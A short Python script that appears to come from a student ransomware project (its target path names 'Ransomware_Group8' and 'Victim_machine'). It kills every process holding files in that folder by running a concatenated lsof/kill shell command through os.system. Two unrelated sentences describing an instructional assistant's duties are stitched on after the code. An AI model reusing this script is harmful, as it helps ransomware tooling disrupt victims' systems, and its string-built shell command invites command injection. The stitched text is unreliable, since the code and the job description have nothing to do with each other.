import os
import sys

paths = ["/media/sf_Ransomware_Group8/Action/Victim_machine/Imp"]
def deleteProcesses(filePath):
   print("\nFile Path:", filePath)
   com = "for proc in $(lsof -t " + filePath + "); do echo 'Killing process : '$proc; kill $proc; done"
   print(com)
   os.system(com)
   print("\nKilled")
  
for path in paths:
   deleteProcesses(path)

Accommodate instructional personnel with the development and presentation of learning materials and instructional exercises. <br>
Assist students in completing classroom assignments, homework, and projects; assure student understanding of classroom rules and procedures; assists students by answering questions, and providing proper examples.
